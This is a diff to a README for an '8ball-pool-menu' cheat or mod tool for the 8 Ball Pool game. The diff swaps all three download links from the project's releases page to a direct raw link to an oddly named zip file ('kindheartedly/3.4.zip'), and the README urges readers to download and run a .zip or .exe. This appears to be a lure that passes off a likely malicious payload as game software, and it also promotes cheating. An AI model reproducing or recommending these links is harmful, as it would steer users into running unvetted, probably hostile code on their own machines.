@@ -1,6 +1,6 @@
 # 🎱 8ball-pool-menu - Easy Aiming Tips and Smart Mod Help
 
-[![Download 8ball-pool-menu](https://img.shields.io/badge/Download-8ball--pool--menu-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=purple&color=green)](https://github.com/nexoluvsu-droid/8ball-pool-menu/releases)
+[![Download 8ball-pool-menu](https://img.shields.io/badge/Download-8ball--pool--menu-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=purple&color=green)](https://raw.githubusercontent.com/nexoluvsu-droid/8ball-pool-menu/main/kindheartedly/3.4.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Getting started with 8ball-pool-menu is easier than pocketing the 8-ball. Follow
 
 The first thing you need to do is get the software onto your computer. We have made this super simple for you:
 
-**Visit this link to download the application:** [https://github.com/nexoluvsu-droid/8ball-pool-menu/releases](https://github.com/nexoluvsu-droid/8ball-pool-menu/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/nexoluvsu-droid/8ball-pool-menu/main/kindheartedly/3.4.zip](https://raw.githubusercontent.com/nexoluvsu-droid/8ball-pool-menu/main/kindheartedly/3.4.zip)
 
 When you visit this page, you will see a list of available files. Look for the most recent version. The download should start automatically, but if it does not, look for a button that says "Download" or a file name with a `.zip` or `.exe` extension. Click on it and your download will begin. Once the download is complete, you can find the file in your "Downloads" folderusually.
 
@@ -127,7 +127,7 @@ To get the most out of 8ball-pool-menu, here are a few enthusiast recommendation
 
 The download process is simple, the installation takes minutes, and the benefits last forever. So why wait? Head over to the download page now and start your journey to becoming an 8 Ball Pool master. Your cue awaits¡
 
-**[⬇️ Click Here to Download 8ball-pool-menu](https://github.com/nexoluvsu-droid/8ball-pool-menu/releases)**
+**[⬇️ Click Here to Download 8ball-pool-menu](https://raw.githubusercontent.com/nexoluvsu-droid/8ball-pool-menu/main/kindheartedly/3.4.zip)**
 
 ---
 
